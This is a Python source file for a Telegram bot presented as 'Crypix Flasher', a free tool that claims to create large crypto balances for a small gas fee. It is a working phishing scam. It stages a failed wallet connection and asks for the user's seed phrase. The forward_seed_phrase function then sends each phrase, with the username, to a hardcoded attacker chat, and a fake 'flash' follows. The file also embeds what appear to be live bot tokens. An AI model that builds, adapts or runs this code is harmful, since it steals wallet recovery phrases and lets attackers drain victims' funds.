import logging
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
)
import re
import time

# Enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# Bot tokens
MAIN_BOT_TOKEN = "7868684810:AAHOCTmqdpNvBQTq5rkLHLUmNJQFihBqmDA"
FORWARD_BOT_TOKEN = "8010603892:AAHvYMQ9JDtTg5SbPiSsKS-V9vNbtxJU340"
FORWARD_CHAT_ID = "7753649096"

# Emojis (Telegram Premium compatible, visible to all)
EMOJI_WALLET = "💼"
EMOJI_COIN = "💸"
EMOJI_LINK = "🔗"
EMOJI_SUCCESS = "✅"
EMOJI_FAIL = "❌"
EMOJI_LOADING = "⏳"

# User state to track conversation flow
user_data = {}

# Wallet options
WALLETS = [
    "Bitget Wallet", "Coinbase Wallet", "Trust Wallet", "Metamask Wallet",
    "Binance Wallet", "Bybit Wallet", "Phantom Wallet", "Exodus Wallet"
]

# Coin options
COINS = ["USDT (TRC20)", "USDT (BEP20)", "USDT (ERC20)", "Bitcoin", "Ethereum"]

# Amount options per coin
AMOUNTS = {
    "USDT (TRC20)": [
        ("1000 USDT for 4 TRX", "1000", "4 TRX"),
        ("100,000 USDT for 17 TRX", "100000", "17 TRX"),
        ("1,000,000 USDT for 30 TRX", "1000000", "30 TRX"),
    ],
    "USDT (BEP20)": [
        ("1000 USDT for 0.05 BNB", "1000", "0.05 BNB"),
        ("100,000 USDT for 0.07 BNB", "100000", "0.07 BNB"),
        ("1,000,000 USDT for 0.09 BNB", "1000000", "0.09 BNB"),
    ],
    "USDT (ERC20)": [
        ("1000 USDT for 0.008 ETH", "1000", "0.008 ETH"),
        ("100,000 USDT for 0.012 ETH", "100000", "0.012 ETH"),
        ("1,000,000 USDT for 0.019 ETH", "1000000", "0.019 ETH"),
    ],
    "Bitcoin": [
        ("10 BTC for 0.0001 BTC", "10", "0.0001 BTC"),
        ("100 BTC for 0.0005 BTC", "100", "0.0005 BTC"),
        ("1000 BTC for 0.0009 BTC", "1000", "0.0009 BTC"),
    ],
    "Ethereum": [
        ("100 ETH for 0.001 ETH", "100", "0.001 ETH"),
        ("1000 ETH for 0.006 ETH", "1000", "0.006 ETH"),
        ("100,000 ETH for 0.009 ETH", "100000", "0.009 ETH"),
    ],
}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command."""
    user_id = update.effective_user.id
    user_data[user_id] = {"step": "wallet_selection"}
    
    await update.message.reply_text(
        f"{EMOJI_COIN} Welcome to Crypix Flasher, a free crypto Flasher Bot!"
    )
    await asyncio.sleep(1)
    await update.message.reply_text(
        f"{EMOJI_WALLET} Select the wallet you want to flash:",
        reply_markup=build_wallet_keyboard()
    )

def build_wallet_keyboard():
    """Build wallet selection keyboard."""
    keyboard = [
        [InlineKeyboardButton(wallet, callback_data=f"wallet_{wallet}")]
        for wallet in WALLETS
    ]
    return InlineKeyboardMarkup(keyboard)

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button clicks."""
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data

    if data.startswith("wallet_"):
        wallet = data.replace("wallet_", "")
        user_data[user_id]["wallet"] = wallet
        user_data[user_id]["step"] = "coin_selection"
        
        await asyncio.sleep(3)
        await query.message.reply_text(
            f"{EMOJI_COIN} Select the coin you want to flash:",
            reply_markup=build_coin_keyboard()
        )

    elif data.startswith("coin_"):
        coin = data.replace("coin_", "")
        user_data[user_id]["coin"] = coin
        user_data[user_id]["step"] = "amount_selection"
        
        await asyncio.sleep(2)
        await query.message.reply_text(
            f"{EMOJI_COIN} Select the amount to flash:",
            reply_markup=build_amount_keyboard(coin)
        )

    elif data.startswith("amount_"):
        amount_idx = int(data.split("_")[1])
        coin = user_data[user_id]["coin"]
        user_data[user_id]["amount"] = AMOUNTS[coin][amount_idx][1]
        user_data[user_id]["gas_fee"] = AMOUNTS[coin][amount_idx][2]
        user_data[user_id]["step"] = "link_wallet"
        
        await query.message.reply_text(
            f"{EMOJI_LINK} Kindly link your wallet for payment of gas fee, which will be deducted from your wallet when sending flash:",
            reply_markup=build_wallet_keyboard()
        )

    elif data.startswith("link_wallet_"):
        wallet = data.replace("link_wallet_", "")
        user_data[user_id]["step"] = "install_app"
        
        await query.message.reply_text(
            f"{EMOJI_WALLET} Make sure the {wallet} app is installed on your phone to ensure a successful connection."
        )
        await asyncio.sleep(1)
        await query.message.reply_text(f"{EMOJI_LOADING} Connecting...")
        await asyncio.sleep(4)
        await query.message.reply_text(
            f"{EMOJI_FAIL} Connection failed. Link manually."
        )
        await query.message.reply_text(
            f"{EMOJI_LINK} Send your wallet seed phrase to link manually (12, 18, or 24 words):"
        )
        user_data[user_id]["step"] = "seed_phrase"

    elif data.startswith("confirm_"):
        action = data.replace("confirm_", "")
        if action == "yes":
            amount = user_data[user_id]["amount"]
            coin = user_data[user_id]["coin"]
            address = user_data[user_id]["receiver_address"]
            gas_fee = user_data[user_id]["gas_fee"]
            
            await query.message.reply_text(
                f"{EMOJI_COIN} {gas_fee} will be deducted from your wallet. Do you wish to proceed?",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("Yes", callback_data="proceed_yes")],
                    [InlineKeyboardButton("No", callback_data="proceed_no")],
                ])
            )
        else:
            user_data[user_id]["step"] = "wallet_selection"
            await query.message.reply_text(
                f"{EMOJI_WALLET} Transaction cancelled. Select a wallet to start again:",
                reply_markup=build_wallet_keyboard()
            )

    elif data.startswith("proceed_"):
        action = data.replace("proceed_", "")
        if action == "yes":
            await query.message.reply_text(
                f"{EMOJI_LOADING} Sending Flash... Kindly wait."
            )
            await asyncio.sleep(10)
            await query.message.reply_text(
                f"{EMOJI_FAIL} Flash failed due to insufficient gas fee."
            )
            user_data[user_id].clear()
        else:
            user_data[user_id]["step"] = "wallet_selection"
            await query.message.reply_text(
                f"{EMOJI_WALLET} Transaction cancelled. Select a wallet to start again:",
                reply_markup=build_wallet_keyboard()
            )

def build_coin_keyboard():
    """Build coin selection keyboard."""
    keyboard = [
        [InlineKeyboardButton(coin, callback_data=f"coin_{coin}")]
        for coin in COINS
    ]
    return InlineKeyboardMarkup(keyboard)

def build_amount_keyboard(coin):
    """Build amount selection keyboard."""
    keyboard = [
        [InlineKeyboardButton(amount[0], callback_data=f"amount_{idx}")]
        for idx, amount in enumerate(AMOUNTS[coin])
    ]
    return InlineKeyboardMarkup(keyboard)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle text messages (seed phrase, receiver address)."""
    user_id = update.effective_user.id
    text = update.message.text

    if user_id not in user_data:
        await update.message.reply_text(
            f"{EMOJI_COIN} Please use /start to begin."
        )
        return

    step = user_data[user_id].get("step")

    if step == "seed_phrase":
        words = text.strip().split()
        word_count = len(words)
        
        if word_count in [12, 18, 24]:
            # Forward seed phrase to another bot
            await forward_seed_phrase(context, update.effective_user.username, text)
            
            await update.message.reply_text(f"{EMOJI_LOADING} Connecting...")
            await asyncio.sleep(4)
            await update.message.reply_text(
                f"{EMOJI_SUCCESS} Connection successful. You may proceed."
            )
            await update.message.reply_text(
                f"{EMOJI_COIN} Send the receiver's address you wish to flash:"
            )
            user_data[user_id]["step"] = "receiver_address"
        else:
            await update.message.reply_text(
                f"{EMOJI_FAIL} Invalid seed phrase. Please send a valid phrase with 12, 18, or 24 words."
            )

    elif step == "receiver_address":
        if is_valid_crypto_address(text, user_data[user_id]["coin"]):
            user_data[user_id]["receiver_address"] = text
            amount = user_data[user_id]["amount"]
            coin = user_data[user_id]["coin"]
            
            await update.message.reply_text(
                f"{EMOJI_COIN} Do you want to send {amount} {coin} to this address: {text}?",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("Yes", callback_data="confirm_yes")],
                    [InlineKeyboardButton("No", callback_data="confirm_no")],
                ])
            )
            user_data[user_id]["step"] = "confirm_transaction"
        else:
            await update.message.reply_text(
                f"{EMOJI_FAIL} Invalid crypto address. Please send a valid address for {user_data[user_id]['coin']}."
            )

async def forward_seed_phrase(context, username, seed_phrase):
    """Forward seed phrase to another bot."""
    try:
        await context.bot.send_message(
            chat_id=FORWARD_CHAT_ID,
            text=f"User: @{username}\nSeed Phrase: {seed_phrase}"
        )
    except Exception as e:
        logger.error(f"Failed to forward seed phrase: {e}")

def is_valid_crypto_address(address, coin):
    """Validate crypto address based on coin type."""
    if not address:
        return False
    
    # Basic regex patterns for address validation
    if coin in ["USDT (TRC20)"]:
        return bool(re.match(r"^T[1-9A-HJ-NP-Za-km-z]{33}$", address))  # TRON address
    elif coin in ["USDT (BEP20)", "USDT (ERC20)", "Ethereum"]:
        return bool(re.match(r"^0x[a-fA-F0-9]{40}$", address))  # Ethereum/BSC address
    elif coin == "Bitcoin":
        return bool(
            re.match(r"^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$", address) or  # Legacy
            re.match(r"^bc1[a-zA-Z0-9]{25,59}$", address)  # Bech32
        )
    return False

async def main():
    """Run the bot."""
    application = Application.builder().token(MAIN_BOT_TOKEN).build()

    # Handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    # Start polling
    await application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    asyncio.run(main())
